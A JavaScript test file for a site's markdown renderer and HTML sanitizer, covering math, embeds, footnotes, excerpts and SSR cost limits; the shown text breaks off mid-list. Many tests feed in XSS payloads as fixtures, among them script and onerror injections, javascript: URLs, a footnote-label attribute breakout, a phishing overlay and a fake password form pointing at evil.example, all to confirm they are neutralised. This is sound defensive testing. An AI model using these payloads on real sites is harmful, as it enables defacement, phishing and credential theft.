import assert from "node:assert/strict";
import { after, before, test } from "node:test";
import { createServer } from "vite";

let server;
let markdown;
let plainText;
let createSlashCommands;

before(async () => {
  server = await createServer({
    appType: "custom",
    logLevel: "silent",
    server: { middlewareMode: true },
  });
  markdown = await server.ssrLoadModule("/src/lib/utils/markdown.ts");
  plainText = await server.ssrLoadModule("/src/lib/utils/plainText.ts");
  ({ createSlashCommands } = await server.ssrLoadModule(
    "/src/lib/components/mdEditor/slashCommands.ts",
  ));
});

after(async () => {
  await server?.close();
});

test("renders the f2z inline-double-dollar convention and keeps single dollars literal", () => {
  const html = markdown.processMarkdown(
    "Inline $$\\LaTeX$$ and $$\\int_{a}^{b} x^2 dx$$. I have $80 and Jim has $20.",
  );

  assert.equal((html.match(/class="katex"/g) || []).length, 2);
  assert.match(html, /I have \$80 and Jim has \$20/);
  assert.doesNotMatch(html, /math-block/);

  const standalone = markdown.processMarkdown("$$x^2$$");
  // Inline, i.e. still inside a `<p>` and NOT `math-block`. Inline math grew an
  // isolating `math-inline` wrapper, so this no longer pins the exact
  // first element — it pins the two things it was ever about: the paragraph and
  // the absence of display mode.
  assert.match(standalone, /^<p><span\b[^>]*>/);
  assert.match(standalone, /class="math math-inline"/);
  assert.match(standalone, /<span class="katex">/);
  assert.doesNotMatch(standalone, /math-block/);
});

test("renders display math only for block-delimited double dollars", () => {
  const html = markdown.processMarkdown("$$\n\\sum_{n=1}^{10} n\n$$");
  assert.match(html, /class="math math-block"/);
  assert.match(html, /katex-display/);
});

test("renders directives without interpreting directive examples inside code", () => {
  const source = [
    "`::qrcode[literal]`",
    "",
    "::qrcode[free2z.com]",
    "",
    "::embed[https://www.youtube.com/watch?v=q2fIWB8o-bs]",
    "",
    "::embed[/uploadz/public/creator/example.mp3]",
    "",
    "::iframe[https://example.com/article]",
  ].join("\n");
  const html = markdown.processMarkdown(source);

  // The contract is that the directive inside a code span is NOT interpreted.
  // `<code[^>]*>` and not a bare `<code>`: the tag grew a `dir`, and
  // pinning an element's whole opening tag to assert something about its text
  // is how a test goes red on a change it has no opinion about.
  assert.match(html, /<code[^>]*>::qrcode\[literal\]<\/code>/);
  assert.match(html, /class="qrcode-embed" data-qr-value="free2z.com"/);
  assert.match(
    html,
    /data-embed-url="https:\/\/www.youtube.com\/watch\?v=q2fIWB8o-bs"/,
  );
  assert.match(html, /class="audio-embed-placeholder"/);
  assert.match(html, /\/uploadz\/public\/creator\/example.mp3/);
  assert.match(html, /data-embed-url="https:\/\/example.com\/article"/);

  const videos = markdown.processMarkdown(
    [
      "::embed[/uploadz/video.mp4#t=2]",
      "",
      "::embed[https://free2z.com/uploadz/video.webm?token=abc]",
    ].join("\n"),
  );
  assert.equal((videos.match(/<video\b/g) || []).length, 2);
  assert.equal((videos.match(/preload="metadata"/g) || []).length, 2);
  assert.doesNotMatch(videos, /markdown-embed-image/);

  // The renderer has no page origin during SSR, so an absolute video URL must
  // stay inert until the browser can decide whether it is same-origin. In
  // particular, the tracker's URL must not appear in a live `source src`.
  const thirdPartyVideo = markdown.processMarkdown(
    "::embed[https://tracker.example/probe.mp4]",
  );
  assert.match(thirdPartyVideo, /class="video-embed-placeholder"/);
  assert.match(
    thirdPartyVideo,
    /data-video-url="https:\/\/tracker\.example\/probe\.mp4"/,
  );
  assert.doesNotMatch(thirdPartyVideo, /<video\b|<source\b[^>]*\bsrc=/);

  const thirdPartyAudio = markdown.processMarkdown(
    "::embed[https://tracker.example/probe.wav]",
  );
  assert.match(thirdPartyAudio, /class="audio-embed-placeholder"/);
  assert.match(
    thirdPartyAudio,
    /data-audio-url="https:\/\/tracker\.example\/probe\.wav"/,
  );
  assert.doesNotMatch(thirdPartyAudio, /<audio\b[^>]*\bsrc=/);
});

test("adds highlighting, requested line emphasis, and line numbers", () => {
  const html = markdown.processMarkdown(
    "```js {1,3} showLineNumbers\nconst x = 1;\nreturn x;\nfoo();\n```",
  );

  assert.match(html, /class="hljs language-js show-line-numbers"/);
  assert.match(html, /hljs-keyword/);
  assert.equal((html.match(/code-line-highlighted/g) || []).length, 2);
  assert.equal((html.match(/class="code-line(?: |")/g) || []).length, 3);

  const multiline = markdown.processMarkdown(
    "```js\n/* first\nsecond\nthird */\n```",
  );
  assert.equal((multiline.match(/hljs-comment/g) || []).length, 3);

  const bounded = markdown.processMarkdown(
    "```js {1-999999999} showLineNumbers\nconst first = 1;\nconst second = 2;\n```",
  );
  assert.equal((bounded.match(/code-line-highlighted/g) || []).length, 2);
});

test("does not alter footnote-shaped examples inside longer fenced blocks", () => {
  const html = markdown.processMarkdown(
    "````md\nexample\n```\n[^1]: literal definition\n````",
  );

  assert.equal((html.match(/class="code-line(?: |")/g) || []).length, 3);
  assert.doesNotMatch(html, /class="footnotes"/);
  assert.match(html, /literal definition/);
});

test("renders GFM footnotes and heading ids", () => {
  const source = [
    "# Repeated heading",
    "",
    "## Repeated heading",
    "",
    "Reference[^1].",
    "[^1]: Footnote content.",
  ].join("\n");
  const html = markdown.processMarkdown(source);

  assert.match(html, /id="repeated-heading"/);
  assert.match(html, /id="repeated-heading-1"/);
  assert.match(html, /data-footnote-ref/);
  assert.match(html, /class="footnotes"/);
});

test("strips YAML frontmatter and escapes author-supplied raw HTML", () => {
  const html = markdown.processMarkdown(
    "---\nsocials:\n  github: free2z\n---\n\nHello <img src=x onerror=alert(1)> [bad](javascript:alert(1))",
  );

  assert.doesNotMatch(html, /socials|github: free2z/);
  assert.doesNotMatch(html, /<img\b/);
  assert.doesNotMatch(html, /href="javascript:/);
  assert.match(html, /&lt;img src=x onerror=alert\(1\)&gt;/);

  const middleBlock = markdown.processMarkdown(
    "Intro\n\n---\nnot frontmatter\n---\n\nAfter",
  );
  assert.match(middleBlock, /not frontmatter/);
  assert.match(middleBlock, /After/);

  const emptyFrontmatter = markdown.processMarkdown("---\n---\nBody");
  assert.equal(emptyFrontmatter, "<p>Body</p>\n");
});

test("author-supplied raw HTML never survives as markup (load-bearing for SSR)", () => {
  // `renderer.html` escaping ALL author raw HTML is what makes  safe.
  // the article body is emitted into the server markup and, on the
  // happy path, the browser deliberately does NOT re-sanitize it — `setContent`
  // reuses the server's nodes. So this escaping plus Node-side DOMPurify are
  // the only filters, with no browser backstop, and anything that did survive
  // would be parsed by the document parser, where `<script>` executes.
  //
  // If this test fails, do not "fix" it by loosening the assertion: it means
  // MarkdownContent's SSR snapshot has become the primary XSS filter.
  const hostile = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<iframe src=https://evil.example.com></iframe>",
    "<svg/onload=alert(1)>",
    "<a href=javascript:alert(1)>x</a>",
    "<body onload=alert(1)>",
    "<style>@import url(https://evil.example.com)</style>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    "<form><input name=innerHTML>",
    "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
  ];

  // Only marked's own block wrappers may appear as real tags. Asserting the
  // allowlist rather than a denylist means a novel payload cannot slip through
  // by using a tag nobody thought to ban.
  const GENERATED_TAGS = new Set(["p", "/p", "br", "hr", "a", "/a"]);

  for (const source of hostile) {
    const rendered = markdown.processMarkdown(source);

    const tags = [...rendered.matchAll(/<\/?[a-z][a-z0-9]*/gi)].map((match) =>
      match[0].slice(1).toLowerCase(),
    );
    for (const tag of tags) {
      assert.ok(
        GENERATED_TAGS.has(tag),
        `author raw HTML survived as a real <${tag}> element: ${source}`,
      );
    }

    // It survives as visible text — escaped — which is the intended behaviour.
    assert.match(rendered, /&lt;/, `expected escaped text for: ${source}`);
  }
});

test("extracts readable card text instead of truncating raw markdown", () => {
  const excerpt = markdown.extractPlainText(
    "# Heading\n\nHello **world** with [a link](https://free2z.com).",
    200,
  );

  assert.equal(excerpt, "Heading Hello world with a link.");

  assert.equal(
    markdown.extractPlainText("Text[^1].\n[^1]: Footnote content.", 200),
    "Text.",
  );
});

test("profile excerpts omit standalone media directives from the selected body", () => {
  const story = {
    description: "",
    content:
      "::embed[/uploadz/public/DeivisLopez/vid_20240913_095254_371.mp4]...",
  };

  assert.equal(
    markdown.extractPlainText(story.description || story.content, 100),
    "",
  );
  assert.equal(
    markdown.extractPlainText(
      "A day at camp.\n\n::embed[/uploadz/public/creator/video.mp4]\n\nMore about the visit.",
      200,
    ),
    "A day at camp. More about the visit.",
  );
  assert.equal(
    markdown.extractPlainText("`::embed[/uploadz/public/example.mp4]`", 200),
    "::embed[/uploadz/public/example.mp4]",
  );
  assert.equal(
    markdown.extractPlainText(
      "```md\n::embed[/uploadz/public/example.mp4]\n```",
      200,
    ),
    "::embed[/uploadz/public/example.mp4]",
  );
  assert.match(
    markdown.processMarkdown("::embed[/uploadz/public/creator/video.mp4]"),
    /class="markdown-video"/,
  );
});

test("plain-text card summaries omit directives without rewriting prose or code", () => {
  assert.equal(
    plainText.stripMediaDirectivesFromSummary(
      "```md\n::embed[/uploadz/public/example.mp4]\n```",
    ),
    "```md\n::embed[/uploadz/public/example.mp4]\n```",
  );
  assert.equal(
    plainText.markdownToPlainText(
      "Read **the update**.\n\n::iframe[https://example.com/video]…",
      200,
    ),
    "Read the update.",
  );
  assert.equal(
    plainText.markdownToPlainText(
      "```md\n::embed[/uploadz/public/example.mp4]\n```",
      200,
    ),
    "",
  );
  assert.equal(
    plainText.markdownToPlainText(
      "The syntax `::embed[path]` is documented.",
      200,
    ),
    "The syntax ::embed[path] is documented.",
  );
});

test("both excerpt extractors drop an API-truncated media directive", () => {
  const longMediaDirective =
    "::embed[/uploadz/public/creator/" + "x".repeat(400) + ".mp4]";
  const truncatedBody =
    `Readable prose.\n\n${longMediaDirective}`.slice(0, 365) + "...";

  assert.equal(plainText.markdownToPlainText(truncatedBody), "Readable prose.");
  assert.equal(markdown.extractPlainText(truncatedBody), "Readable prose.");
});

test("same-line triple-backtick code does not hide a following media directive", () => {
  const source =
    "```syntax example```\n\n::embed[/uploadz/public/creator/video.mp4]...";

  assert.doesNotMatch(
    plainText.stripMediaDirectivesFromSummary(source),
    /::embed/,
  );
  assert.equal(plainText.markdownToPlainText(source), "");
  assert.equal(markdown.extractPlainText(source), "syntax example");
});

test("editor slash commands insert the supported f2z syntax", () => {
  // Slash-command names are localized; pass an identity translator so the
  // English fallbacks are used and the lookups below stay deterministic.
  const translate = (_key, fallback) => fallback ?? _key;
  const commands = Object.fromEntries(
    createSlashCommands(translate).map((command) => [command.name, command]),
  );

  assert.equal(commands["Inline math"].insert, "$$x^2$$");
  assert.equal(
    commands["Math block"].insert.slice(
      commands["Math block"].selectionStartOffset,
      commands["Math block"].selectionEndOffset,
    ),
    "\\frac{a}{b}",
  );
  assert.equal(
    commands["QR code"].insert,
    "::qrcode[zcash address or content]",
  );
  assert.equal(commands.Iframe.insert, "::iframe[https://example.com]");
  assert.match(
    commands["Audio embed"].insert,
    /^::embed\[\/uploadz\/.*\.mp3\]$/,
  );
  assert.match(commands.Footnote.insert, /\[\^1\]: Footnote content/);
  assert.match(commands["Numbered code block"].insert, /showLineNumbers/);
  assert.equal(
    commands["Inline math"].insert.slice(
      commands["Inline math"].selectionStartOffset,
      commands["Inline math"].selectionEndOffset,
    ),
    "x^2",
  );
  assert.equal(
    commands["QR code"].insert.slice(
      commands["QR code"].selectionStartOffset,
      commands["QR code"].selectionEndOffset,
    ),
    "zcash address or content",
  );
  assert.equal(
    commands.Footnote.insert.slice(
      commands.Footnote.selectionStartOffset,
      commands.Footnote.selectionEndOffset,
    ),
    "Footnote content",
  );

  const rendered = markdown.processMarkdown(
    [
      commands["Inline math"].insert,
      "",
      commands["QR code"].insert,
      "",
      commands.Iframe.insert,
      "",
      commands.Footnote.insert,
      "",
      commands["Numbered code block"].insert,
    ].join("\n"),
  );
  assert.match(rendered, /class="katex"/);
  assert.match(rendered, /class="qrcode-embed"/);
  assert.match(rendered, /data-embed-url="https:\/\/example.com\/"/);
  assert.match(rendered, /class="footnotes"/);
  assert.match(rendered, /show-line-numbers/);
});

test("article images get deferred-loading hints and are never URL-rewritten", () => {
  const html = markdown.processMarkdown(
    "![alt](https://free2z.cash/uploadz/public/u/photo.png)",
  );

  assert.match(html, /<img\b[^>]*loading="lazy"/);
  assert.match(html, /<img\b[^>]*decoding="async"/);
  assert.match(html, /<img\b[^>]*fetchpriority="low"/);

  // The src must be exactly what the author wrote (modulo the upload-host
  // rewrite). Guessing `<base>.webp` served the LEGACY quality=50 thumbnail
  // (py/free2z/dj/apps/uploads/image_utils.py) at full article width, and 404'd
  // whenever storage uniquified the name or thumbnailing was skipped. The real
  // ladder is `<base>_w{width}.webp` and is only reachable via the API.
  assert.match(html, /src="[^"]*\/uploadz\/public\/u\/photo\.png"/);
  assert.doesNotMatch(html, /photo\.webp/);
  assert.doesNotMatch(html, /data-fallback-src/);

  // `sizes` without a `srcset` is a no-op attribute; don't emit it.
  assert.doesNotMatch(html, /<img\b[^>]*\ssizes=/);
});

test("sanitizer does not URL-filter data-* attributes", async () => {
  // Documents a real DOMPurify behaviour rather than asserting our intent:
  // ALLOWED_URI_REGEXP applies to src/href but NOT to data-*. So a data-*
  // attribute must never be fed into a URL sink without its own scheme check.
  // If this test ever starts failing because DOMPurify tightened, great —
  // delete it and the warning in markdown-sanitize.ts.
  const { sanitizeMarkdownHtml, markdownSanitizeOptions } =
    await server.ssrLoadModule("/src/lib/utils/markdown-sanitize.ts");

  const out = sanitizeMarkdownHtml(
    '<img src="javascript:alert(1)" data-embed-url="javascript:alert(1)" alt="x">',
  );

  assert.doesNotMatch(out, /src="javascript:/);
  assert.match(out, /data-embed-url="javascript:alert\(1\)"/);

  // No URL-bearing attribute may be added to the allowlist without a
  // point-of-use scheme check. `data-*-url` / `data-qr-value` are read as
  // opaque text by MarkdownContent and re-validated downstream.
  const urlBearing = markdownSanitizeOptions.ADD_ATTR.filter(
    (attr) => attr.startsWith("data-") && /url|src|href/.test(attr),
  );
  assert.deepEqual(urlBearing.sort(), [
    "data-audio-url",
    "data-embed-url",
    "data-video-url",
  ]);
});

// the regression contract — marked-footnote@1.4.0 interpolates
// the RAW footnote label into `aria-label="Back to reference {0}"` with no
// escaping, so the label is an arbitrary-HTML sink. `<style>` and `style=`
// survive DOMPurify, so this is page-wide CSS defacement / attribute
// exfiltration / a full-viewport phishing overlay on a free2z.cash page — and
// one DOMPurify CVE away from stored XSS. markdown.ts pins a constant
// `backRefLabel` with no `{0}` to kill the interpolation.
const FOOTNOTE_STYLE_PAYLOAD =
  '"><style>body *{visibility:hidden}html::after{content:"free2z is down";visibility:visible;position:fixed;inset:0;background:#000;color:#0f0;font-size:3rem}</style>';
const FOOTNOTE_OVERLAY_PAYLOAD =
  '"><a style="position:fixed;inset:0;z-index:2147483647;background:#fff" href="https://evil.example/login">';

// Every `"`-delimited attribute value in the document must be free of raw
// `<`/`>`; a `"` cannot survive inside one by construction, so those two
// characters are the whole breakout surface.
function assertAttributeValuesAreClean(html) {
  const attributes = html.match(/\s[\w:-]+="[^"]*"/g) || [];
  assert.ok(attributes.length > 0, "expected attributes to inspect");
  for (const attribute of attributes) {
    assert.doesNotMatch(attribute, /[<>]/, `unescaped markup in ${attribute}`);
  }
}

function footnoteDocument(label, referenceCount = 1) {
  const references = Array.from(
    { length: referenceCount },
    (_, index) => `Ref ${index + 1}[^${label}]`,
  ).join(" ");
  return `${references}\n\n[^${label}]: Definition.\n`;
}

test("footnote labels cannot inject markup through the backref aria-label", () => {
  for (const payload of [FOOTNOTE_STYLE_PAYLOAD, FOOTNOTE_OVERLAY_PAYLOAD]) {
    // Two references make the library emit two backref anchors for the same
    // label, which is the shape that leaked injected nodes out of the
    // <section class="footnotes"> wrapper.
    for (const referenceCount of [1, 2]) {
      const html = markdown.processMarkdown(
        footnoteDocument(payload, referenceCount),
      );

      assert.doesNotMatch(html, /<style/i);
      assert.doesNotMatch(html, /style\s*=/i);
      // `evil.example` may still appear percent-encoded *inside* a fragment
      // identifier, which is inert. What must not exist is a navigable link to
      // it: every href in these documents is a same-page fragment.
      assert.doesNotMatch(html, /href="(?!#)/);
      // The label must never reach an attribute un-encoded: every backref
      // aria-label is the constant, and every href/id is percent-encoded.
      assert.doesNotMatch(html, /aria-label="Back to reference [^"]/);
      // A `"` cannot appear inside a `"`-delimited value, so `<`/`>` are the
      // only characters left that could break out of one.
      assertAttributeValuesAreClean(html);
    }
  }
});

test("footnote labels containing quotes and angle brackets are escaped", () => {
  const html = markdown.processMarkdown(footnoteDocument('a"b<c>d'));

  // Still a working footnote...
  assert.match(html, /class="footnotes"/);
  assert.match(html, /data-footnote-ref/);
  assert.match(html, /data-footnote-backref/);
  assert.match(html, /Definition\./);

  //...but no raw quote/angle bracket escapes any attribute value.
  assertAttributeValuesAreClean(html);
  assert.match(html, /id="footnote-a%22b%3Cc%3Ed"/);
});

test("normal footnotes still render references, definitions and backrefs", () => {
  const html = markdown.processMarkdown(
    [
      "First[^1] and second[^note] and first again[^1].",
      "",
      "[^1]: One.",
      "",
      "[^note]: Two.",
    ].join("\n"),
  );

  assert.match(html, /<section class="footnotes"/);
  assert.equal((html.match(/data-footnote-ref/g) || []).length, 3);
  assert.equal((html.match(/id="footnote-1"/g) || []).length, 1);
  assert.equal((html.match(/id="footnote-note"/g) || []).length, 1);
  // Duplicate label -> two backrefs on the same <li>, the second numbered.
  assert.equal((html.match(/data-footnote-backref/g) || []).length, 3);
  assert.match(html, /href="#footnote-ref-1"[^>]*data-footnote-backref/);
  assert.match(html, /href="#footnote-ref-1-2"[^>]*data-footnote-backref/);
  assert.match(html, /↩<sup>2<\/sup>/);
  assert.match(html, /One\./);
  assert.match(html, /Two\./);

  // Every backref carries the constant label — a11y trade-off of the  fix.
  assert.equal((html.match(/aria-label="Back to reference"/g) || []).length, 3);
});

test("the server-rendered markup snapshot is sanitized and cost-capped", async () => {
  //  emits the article body into the markup so crawlers that execute no
  // JavaScript can read it. That means a second full DOM parse per SSR render,
  // on top of processMarkdown's own, and it is synchronous: while it runs the
  // pod answers nothing else, /healthz included. The ceilings keep one absurd
  // article from wedging a replica.
  const {
    sanitizeMarkdownHtmlForMarkup,
    measureMarkupShape,
    SSR_MARKUP_MAX_CHARS,
    SSR_MARKUP_MAX_TAGS,
    SSR_MARKUP_MAX_DEPTH,
  } = await server.ssrLoadModule("/src/lib/utils/markdown-sanitize.ts");

  const shapeOf = (html) =>
    measureMarkupShape(html, Number.MAX_SAFE_INTEGER, Number.MAX_SAFE_INTEGER);

  // It really sanitizes: nothing may reach `{@html}` unfiltered.
  const sanitized = sanitizeMarkdownHtmlForMarkup(
    '<p>keep me</p><script>alert(1)</script><img src=x onerror="alert(1)">',
  );
  assert.match(sanitized, /<p>keep me<\/p>/);
  assert.doesNotMatch(sanitized, /<script/i);
  assert.doesNotMatch(sanitized, /onerror/i);

  // The ceilings are exercised against real processMarkdown output, not flat
  // hand-written strings: what reaches this function is always the expanded
  // document, and expansion is the whole hazard.
  //
  // A very long article at the backend's 100,000-character `content` limit
  // still gets a snapshot: prose is cheap in every dimension.
  const longArticle = Array.from(
    { length: 240 },
    (_, index) =>
      `## Section ${index}\n\n${`Shielded payments keep the memo scanner honest in section ${index}. `.repeat(6)}\n`,
  )
    .join("\n")
    .slice(0, 100_000);
  const longHtml = markdown.processMarkdown(longArticle);
  assert.ok(longHtml.length > 100_000, "expected a large rendered article");
  assert.notEqual(sanitizeMarkdownHtmlForMarkup(longHtml), "");

  // A math-heavy tutorial still gets one. Deliberately NOT `E = mc^2`, which is
  // the cheapest equation KaTeX renders (44 `<` each) and would make this test
  // pass while real math articles fall out; `x^2+y^2=z^2` is 90 `<` each, which
  // is representative. 80 of them expand ~29x, past the byte ceiling that
  // preceded the element ceiling.
  const equation = "x^2+y^2=z^2";
  const mathArticle = Array.from(
    { length: 80 },
    (_, index) =>
      `Given $$${equation}$$ we can write section ${index} with prose around it.\n`,
  ).join("\n");
  const mathHtml = markdown.processMarkdown(mathArticle);
  assert.ok(
    mathHtml.length > 25 * mathArticle.length,
    "expected KaTeX to expand hard",
  );
  assert.notEqual(sanitizeMarkdownHtmlForMarkup(mathHtml), "");

  //...and doubling it falls out. Pinning the cliff keeps the ceiling honest:
  // if someone raises it, this says out loud what it buys.
  const biggerMath = markdown.processMarkdown(mathArticle + mathArticle);
  assert.ok(shapeOf(biggerMath).tags > SSR_MARKUP_MAX_TAGS);
  assert.equal(sanitizeMarkdownHtmlForMarkup(biggerMath), "");

  // Element count, not byte count, is what makes the extra parse expensive: a
  // wall of one-word paragraphs is 200 KB but ~16.7k elements, and costs 5x
  // what 3.4 MB of KaTeX costs. It must fall back even under the byte ceiling.
  const nodeHeavy = markdown.processMarkdown("para\n\n".repeat(16_000));
  assert.ok(nodeHeavy.length < SSR_MARKUP_MAX_CHARS, "under the byte ceiling");
  assert.ok(shapeOf(nodeHeavy).tags > SSR_MARKUP_MAX_TAGS);
  assert.equal(sanitizeMarkdownHtmlForMarkup(nodeHeavy), "");

  // DEPTH is the third dimension, and the one that bites hardest. Measured
  // against the SSR bundle, 3.8 KB of source as two `>`x1900 blockquotes
  // renders to ~100 KB / ~7.6k `<` — comfortably under both width ceilings —
  // yet costs ~1.5 SECONDS to parse, because parse cost is superlinear in
  // nesting. Without a depth ceiling that article is admitted.
  //
  // The assertion below uses depth 400, not 1900: past roughly 1,500 `marked`
  // overflows its own call stack and `processMarkdown` catches the RangeError
  // and degrades to escaped source text, which has no nesting at all — so a
  // 1900 fixture would silently stop testing this ceiling. 400 renders for
  // real, every time, and is over the ceiling by the same 6x.
  const deep = markdown.processMarkdown(
    (">".repeat(400) + " deep\n\n").repeat(2),
  );
  assert.match(deep, /<blockquote/, "expected real nesting, not escaped text");
  const deepShape = shapeOf(deep);
  assert.ok(deep.length < SSR_MARKUP_MAX_CHARS, "under the byte ceiling");
  assert.ok(deepShape.tags < SSR_MARKUP_MAX_TAGS, "under the element ceiling");
  assert.ok(deepShape.depth > SSR_MARKUP_MAX_DEPTH, "over the depth ceiling");
  assert.equal(sanitizeMarkdownHtmlForMarkup(deep), "");

  // Real markdown is shallow, and the depth scan must not be fooled by void
  // elements: an image-heavy article never closes its `<img>` tags, and a naive
  // scan would ratchet depth up once per image and drop the article.
  const nested = markdown.processMarkdown(
    "> - item\n>   - nested\n>     - deep\n",
  );
  assert.ok(shapeOf(nested).depth < 10, "ordinary nesting stays shallow");
  const imageHeavy = markdown.processMarkdown(
    Array.from({ length: 200 }, (_, i) => `![alt ${i}](/uploadz/a.png)\n`).join(
      "\n",
    ),
  );
  assert.ok(
    shapeOf(imageHeavy).depth < 10,
    "void elements do not open a level",
  );
  assert.notEqual(sanitizeMarkdownHtmlForMarkup(imageHeavy), "");

  // And past the byte ceiling with almost no elements at all.
  assert.equal(
    sanitizeMarkdownHtmlForMarkup(`<p>${"x".repeat(SSR_MARKUP_MAX_CHARS)}</p>`),
    "",
  );
  assert.equal(sanitizeMarkdownHtmlForMarkup(""), "");
});

// the regression contract — defence in depth against the
//  class rather than the  instance.
test("a nested <style> element never survives the sanitizer", async () => {
  const { sanitizeMarkdownHtml } = await server.ssrLoadModule(
    "/src/lib/utils/markdown-sanitize.ts",
  );

  // Beware the false negative: a BARE <style> was always dropped, so checking
  // only that shape reports success while the real one survives. Both forms
  // below reached the page before FORBID_TAGS; the second is the  shape.
  const shapes = [
    "<style>body{display:none}</style>",
    "<p>x<style>body{display:none}</style></p>",
    '<a aria-label="x"><style>body *{visibility:hidden}</style></a>',
    '<div><span><style>@import url("//evil.example/x")</style></span></div>',
  ];

  for (const shape of shapes) {
    const out = sanitizeMarkdownHtml(shape);
    assert.doesNotMatch(out, /<style/i, `<style> survived: ${shape}`);
    // FORBID_CONTENTS covers `style`, so the CSS text goes with the element
    // instead of being dumped on the page as visible junk.
    assert.doesNotMatch(out, /visibility|display:none|@import/i);
  }
});

test("form controls never survive the markdown sanitizer", async () => {
  const { sanitizeMarkdownHtml } = await server.ssrLoadModule(
    "/src/lib/utils/markdown-sanitize.ts",
  );

  // Markdown cannot produce a form control, and DOMPurify allows them by
  // default. The CSS allowlist still permits a relatively-positioned coloured
  // box, so removing the credential-capture surface is what keeps a future
  // breakout at defacement rather than theft.
  const out = sanitizeMarkdownHtml(
    '<form action="https://evil.example/steal"><label>Password' +
      "<input type=password name=p></label><button>Sign in</button>" +
      "<select><option>x</option></select><textarea></textarea></form>",
  );

  for (const tag of [
    "form",
    "input",
    "button",
    "select",
    "option",
    "textarea",
    "label",
  ]) {
    assert.doesNotMatch(out, new RegExp(`<${tag}`, "i"), `<${tag}> survived`);
  }
  assert.doesNotMatch(out, /evil\.example/);
});

test("inline style attributes are cut down to a CSS property allowlist", async () => {
  const { sanitizeMarkdownHtml, filterInlineStyle } =
    await server.ssrLoadModule("/src/lib/utils/markdown-sanitize.ts");

  // The full-viewport phishing overlay from. It is PURE `style=` — there
  // is no <style> element to forbid — which is why the tag forbid above is
  // only half the fix.
  const overlay = sanitizeMarkdownHtml(
    '<a style="position:fixed;inset:0;z-index:2147483647;background:#fff" href="https://evil.example/login">x</a>',
  );
  assert.doesNotMatch(overlay, /position/i);
  assert.doesNotMatch(overlay, /z-index/i);
  assert.doesNotMatch(overlay, /inset/i);
  assert.doesNotMatch(overlay, /background/i);
  assert.match(overlay, /<a\b/); // the link itself is unremarkable

  // Whole-attribute drops rather than an empty style="".
  assert.doesNotMatch(
    sanitizeMarkdownHtml('<p style="display:none">x</p>'),
    /style=/,
  );

  // Property-level: allowed name, hostile value.
  assert.equal(filterInlineStyle("position:fixed"), "");
  assert.equal(filterInlineStyle("position:sticky"), "");
  assert.equal(filterInlineStyle("position:relative"), "position:relative");
  assert.equal(
    filterInlineStyle('background-color:url("//evil.example/x")'),
    "",
  );
  assert.equal(filterInlineStyle("color:\\75 rl(//evil.example/x)"), "");
  assert.equal(
    filterInlineStyle("height:1em;z-index:9;top:-2px"),
    "height:1em;top:-2px",
  );
  assert.equal(filterInlineStyle("HEIGHT : 1em"), "height:1em");
  assert.equal(filterInlineStyle("height"), "");
  assert.equal(filterInlineStyle("x".repeat(5000)), "");
});

test("KaTeX keeps every inline style it actually emits", () => {
  // The allowlist is derived from katex's own `style.<prop>` assignments. If a
  // KaTeX upgrade starts emitting a new property this fails LOUDLY here rather
  // than quietly mis-rendering equations in production. Re-measure before
  // widening the allowlist; do not add `position: fixed` or `z-index`.
  const html = markdown.processMarkdown(
    [
      "$$\\frac{a}{b}$$",
      "",
      "$$\n\\sum_{n=1}^{10} \\frac{n^2}{\\sqrt{x}}\n$$",
      "",
      "$$\\overline{x}$$ $$\\underline{y}$$ $$\\vec{v}$$",
      "",
      "$$\\int_{a}^{b} x^2 dx$$",
      "",
      "$$\n\\begin{array}{c|c} 1 & 2 \\\\ \\hline 3 & 4 \\end{array}\n$$",
      "",
      "$$\\colorbox{red}{x}$$ $$\\textcolor{blue}{y}$$",
    ].join("\n"),
  );

  for (const expected of [
    "height:",
    "top:",
    "vertical-align:",
    "margin-right:",
    "margin-left:",
    "min-width:",
    "padding-left:",
    "border-bottom-width:",
    "width:",
    "position:relative",
    "background-color:",
    "color:",
  ]) {
    assert.ok(
      html.includes(expected),
      `KaTeX lost an inline style it needs: ${expected}`,
    );
  }

  // No equation may end up with an emptied attribute.
  assert.doesNotMatch(html, /style=""/);
  assert.ok((html.match(/style="/g) || []).length > 30);
});

test("escapeHtmlAttribute escapes single quotes and backticks too", () => {
  //. Not exploitable today because every emitter in markdown.ts uses
  // double quotes — which is exactly the guarantee that disappears the moment
  // someone writes a single-quoted template, and the function's NAME already
  // promises otherwise.
  assert.equal(
    markdown.escapeHtmlAttribute('it\'s a `test` "x" <y> &z'),
    "it&#39;s a &#96;test&#96; &quot;x&quot; &lt;y&gt; &amp;z",
  );

  // `&` must be escaped FIRST or the entities produced below get mangled.
  assert.equal(markdown.escapeHtmlAttribute("&amp;"), "&amp;amp;");
  assert.equal(markdown.escapeHtmlAttribute(null), "");
  assert.equal(markdown.escapeHtmlAttribute(undefined), "");

  // No quote of either kind can close a value in either quoting style.
  for (const quote of ['"', "'", "`"]) {
    const escaped = markdown.escapeHtmlAttribute(
      `${quote} onclick=alert(1) x=${quote}`,
    );
    assert.doesNotMatch(escaped, new RegExp(quote === "`" ? "`" : quote));
  }

  // End to end: a directive value carrying every one of them still lands in
  // exactly one attribute, with no stray tag or attribute alongside it.
  const html = markdown.processMarkdown('::qrcode[it\'s a `test` "x" <y> &z]');
  assert.equal((html.match(/<div\b/g) || []).length, 1);
  assert.doesNotMatch(html, /onclick|<y>x/);
  assert.match(html, /class="qrcode-embed" data-qr-value="[^"]*"><\/div>/);
});

test("the URI allowlist rejects protocol-relative URLs, as it always claimed to", async () => {
  const { sanitizeMarkdownHtml } = await server.ssrLoadModule(
    "/src/lib/utils/markdown-sanitize.ts",
  );

  //  item 3: the `\/(?!\/)` branch existed to block these and did nothing,
  // because the trailing `[^:/?#]*` branch matched empty-then-slash.
  assert.doesNotMatch(
    sanitizeMarkdownHtml('<img src="//evil.example/a.png">'),
    /evil\.example/,
  );
  assert.doesNotMatch(
    sanitizeMarkdownHtml('<a href="//evil.example/x">x</a>'),
    /evil\.example/,
  );

  // Everything the allowlist is supposed to admit still passes.
  for (const [href, expected] of [
    ["https://ok.example/x", /ok\.example/],
    ["http://ok.example/x", /ok\.example/],
    ["mailto:a@b.example", /mailto:/],
    ["tel:+15551234", /tel:/],
    ["/uploadz/a.png", /\/uploadz\/a\.png/],
    ["relative/a.png", /relative\/a\.png/],
    ["a.png", /a\.png/],
    ["?q=1", /\?q=1/],
    ["#frag", /#frag/],
  ]) {
    assert.match(
      sanitizeMarkdownHtml(`<a href="${href}">x</a>`),
      expected,
      `legitimate href was dropped: ${href}`,
    );
  }

  for (const href of [
    "javascript:alert(1)",
